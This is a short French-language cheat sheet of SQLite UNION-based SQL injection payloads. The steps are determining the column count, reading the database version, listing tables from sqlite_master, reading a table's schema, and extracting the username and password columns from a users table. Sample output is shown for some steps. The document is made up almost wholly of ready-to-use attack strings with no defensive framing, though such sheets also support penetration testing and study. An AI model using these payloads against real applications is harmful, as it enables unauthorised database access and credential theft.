# SQLite

## Déterminer le nombre de colonnes

```sh
'union select 1-- -  # erreur
'union select 1, null-- - # pas d'erreur, il y a donc deux colonnes
```

## Retrouver la version de la base de données

```sh
' union select 1, sqlite_version()-- -
```

## Lister les tables

```sh
' union select 1, name from sqlite_master where type='table'-- -

# Output : news, users
```

## Retrouver le format des tables

```sh
' union select 1, sql from sqlite_master where tbl_name = 'users' and type = 'table'-- -

# Output : CREATE TABLE users(username TEXT, password TEXT, Year INTEGER))
```

## Extraction

```sh
' union select username, password from users-- -
```
